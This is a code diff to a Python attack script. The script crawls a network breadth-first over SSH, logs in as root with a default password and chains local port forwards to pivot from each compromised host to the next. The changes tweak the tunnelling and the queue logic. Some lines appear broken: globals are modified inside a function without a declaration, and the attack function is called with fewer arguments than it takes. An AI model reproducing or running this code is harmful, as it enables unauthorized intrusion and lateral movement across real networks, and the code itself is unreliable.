@@ -18,6 +18,7 @@ ROOT = "root"
 q = Queue.Queue()
 ip_list = []
 FORWARD_PORT = 9050
+initial_comps = 0
 
 class Computer:
     def __init__(self, ip, ssh_port):
@@ -102,9 +103,14 @@ def begin_attack(client, host):
     while not q.empty():
         # gets the next computer in BFS
         server = q.get()
+        initial_comps -= 1
         verbose("Connecting to ssh host %s:%d ..." % (server.host, server.ssh_port))
         try:
-            client.connect(server.host, server.ssh_port, username=ROOT, password=DEFAULT_PASS)
+            if initial_comps > 0:
+                client.connect(server.host, server.ssh_port, username=ROOT, password=DEFAULT_PASS)
+            else:
+                client.connect("localhost", server.local_forward, username=ROOT, password=DEFAULT_PASS)
+
         except Exception as e:
             print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
             q.put(server)
@@ -122,7 +128,9 @@ def begin_attack(client, host):
                 # create the compObj and add it to be seen in the queue
                 compObj = Computer(host, port)
                 ip_list.append(host)
-                compObj.local_forward = FORWARD_PORT + threading.activeCount()
+                # adds a new port for each tunnelling
+                compObj.local_forward = FORWARD_PORT
+                FORWARD_PORT += 1
                 q.put(compObj)
 
                 # set up forwarder to the new computer
@@ -136,10 +144,6 @@ def begin_attack(client, host):
 
 if __name__ == "__main__":
     # init paramiko
-    # conf = paramiko.SSHConfig()
-    # conf.parse(open(os.path.expanduser("/etc/ssh/ssh_config")))
-    # host = conf.lookup(ROOT)
-
     client = paramiko.SSHClient()
     client.load_system_host_keys()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -151,14 +155,10 @@ if __name__ == "__main__":
 
     # initialize the queue with starting computer list
     for c in computers:
+        initial_comps += 1
         host, port = get_host_port(c)
         compObj = Computer(host, port)
         ip_list.append(host)
         q.put(compObj)
 
-    try:
-        begin_attack(client)
-    except KeyboardInterrupt:
-        for t in threading.enumerate():
-            pass
-        sys.exit(1)
+    begin_attack(client)
